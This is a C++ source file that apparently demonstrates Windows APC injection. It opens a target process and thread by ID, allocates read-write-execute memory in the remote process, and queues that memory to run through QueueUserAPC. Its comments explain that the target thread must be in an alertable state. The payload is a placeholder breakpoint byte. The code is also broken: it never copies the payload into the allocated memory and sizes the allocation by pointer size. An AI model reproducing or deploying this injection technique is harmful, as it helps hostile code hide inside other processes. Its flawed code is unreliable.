//executing in other process's thread using QueueUserAPC
// For this technique Remote Thread should be in an alertable state
//Thread enters an alertable state when it calls the SleepEx, SignalObjectAndWait, 
//MsgWaitForMultipleObjectsEx, WaitForMultipleObjectsEx, or WaitForSingleObjectEx function.
//To detect an alertable state RIP of thread is at above functions +0x14

#include<iostream>
#include<windows.h>
#include<processthreadsapi.h>
using namespace std;

int main(int argc, char *argv[]){

	if(argc != 3){
		cout<<"Usage: <PID> <TID>"<<endl;
		exit(-1);
	}

	HANDLE target_process, remote_thread;
	DWORD apc;
	LPVOID alloc;

	char *shellcode = "\xcc";

	//get handle to process
	target_process = OpenProcess(PROCESS_VM_OPERATION, FALSE, DWORD(atoi(argv[1])));
	if(target_process == NULL){
		cout<<"Error setting handle to process"<<endl;
		return 1;
	}

	//allocate memory for shellcode
	alloc = VirtualAllocEx(target_process, NULL, sizeof(shellcode), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if(alloc == NULL){
		cout<<"Error allocating memory in remote process"<<endl;
		return 1;
	}

	remote_thread = OpenThread(THREAD_SET_CONTEXT , FALSE, DWORD(atoi(argv[2])));
	if(remote_thread == NULL){
		cout<<"Error opening remote thread"<<endl;
		return 1;
	}


	apc = QueueUserAPC((PTHREAD_START_ROUTINE)alloc, remote_thread, NULL);
	//Can send RCX as third argument. (If using NTQueueApcThread can send RCX, RDX, R8D (Lower half of R8))
	if(apc == 0){
		cout<<"Error in queue apc thread"<<endl;
		return 1;
	}

	cout<<"Success!!!"<<endl;
	CloseHandle(target_process);
	return 0;

}